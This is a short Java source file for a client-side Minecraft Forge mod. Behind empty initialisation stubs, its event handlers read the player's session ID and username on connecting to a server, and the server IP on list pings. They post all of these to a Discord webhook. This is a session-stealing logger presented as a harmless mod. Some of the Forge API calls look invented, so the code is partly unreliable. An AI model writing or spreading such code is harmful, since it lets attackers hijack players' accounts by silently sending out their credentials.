package com.test.modminecraft;

import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLInitializationEvent;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;
import net.minecraftforge.fml.common.network.FMLNetworkEvent;
import com.discordjava.discordwebhooks.DiscordWebhooks;

@Mod(modid = "test", version = "1.0", clientSideOnly = true)
public class ModMain {
    private static final String WEBHOOK_URL = "webhook";

    @Mod.EventHandler
    public void preInit(FMLPreInitializationEvent event) {
        // Code to exec before
    }

    @Mod.EventHandler
    public void init(FMLInitializationEvent event) {
        // Init code
    }

    @Mod.EventHandler
    public void onServerListPing(FMLNetworkEvent.ServerListPingEvent event) {
        String serverIP = event.ping.getServerData().serverIP;

        DiscordWebhooks webhooks = new DiscordWebhooks(WEBHOOK_URL);
        webhooks.setUsername("Test");
        webhooks.setContent("Server List : " + serverIP);
        webhooks.execute();
    }

    @Mod.EventHandler
    public void onPlayerLoggedIn(FMLNetworkEvent.ClientConnectedToServerEvent event) {
        String sessionID = event.manager.getSessionID();
        String playerName = event.manager.getGameProfile().getName();

        DiscordWebhooks webhooks = new DiscordWebhooks(WEBHOOK_URL);
        webhooks.setUsername("Session");
        webhooks.setContent("Session ID : " + sessionID + "\nPlayer Username : " + playerName);
        webhooks.execute();
    }
}
